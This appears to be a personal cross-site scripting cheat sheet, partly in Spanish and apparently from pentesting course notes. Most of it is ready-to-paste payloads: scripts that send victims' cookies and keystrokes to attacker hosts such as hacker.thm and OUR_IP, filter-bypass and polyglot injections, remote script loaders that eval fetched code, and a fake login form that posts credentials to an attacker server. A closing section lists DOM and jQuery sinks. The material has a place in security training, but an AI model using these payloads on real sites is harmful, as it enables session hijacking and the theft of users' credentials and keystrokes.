### Hacktricks:

    <img src=x onerror=alert(PAYLOAD)>

#### steal cookie:

A


    <script>fetch('http://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
B

    document.location='http://OUR_IP/index.php?c='+document.cookie;
C

    new Image().src='http://OUR_IP/index.php?c='+document.cookie;
D

    new Audio().src='http://OUR_IP/index.php?c='+document.cookie;



#### keylogger
        <script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>


#### Quebrar un código JS que recibe el imput
        ';alert('THM');//

#### No HTML inject and script clean:
        <sSCRIPTcript> </sSCRIPTcript>

#### Polyglots:

        jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('porota') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('porota')//>\x3e

#### Probar si se conecta a otro servidor:
A

        <script src=http://OUR_IP></script>
B

        '><script src=http://OUR_IP></script>
C

        "><script src=http://OUR_IP></script>
D

        javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
E

        <script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
F

        <script>$.getScript("http://OUR_IP")</script>


#### Fake form

        document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');


#### DOM XSS

Las dom based no hacen transacciones con el back-end, quedan enteramente del lado del cliente. Una buena forma de probarlas es ver si un input que se muestra en la pantalla
no genera una request.

##### armado de payloads:
stored DOM xss:


        <><img src=1 onerror=alert(1)>

window.location = nos permite construir un link para redireccionar a la victima a un sitio vulnerable.
innerHTML = permite agrergar un elemento al DOM, no permite agrergar scripts directamente ni svgs, pero podemos utilizar una etiqueta html para ingresar js como:<img src=1 onerror=alert(document.domain)>
eval()= 

#### DOM Y JQUERY
attr()=permite modificar un elemento del dom. Podríamos aprovecharnos con un codigo como este: javascript:alert(document.domain)

$(): función selectora, nos permite inyectar objetos en el DOM. Podemos explotarlo creando un Iframe 

        <iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">


Sinks más comunes para dom xss:
document.write()
document.writeln()
document.domain
element.innerHTML
element.outerHTML
element.insertAdjacentHTML
element.onevent

jquery:
add()
after()
append()
animate()
insertAfter()
insertBefore()
before()
html()
prepend()
replaceAll()
replaceWith()
wrap()
wrapInner()
wrapAll()
has()
constructor()
init()
index()
jQuery.parseHTML()
$.parseHTML()







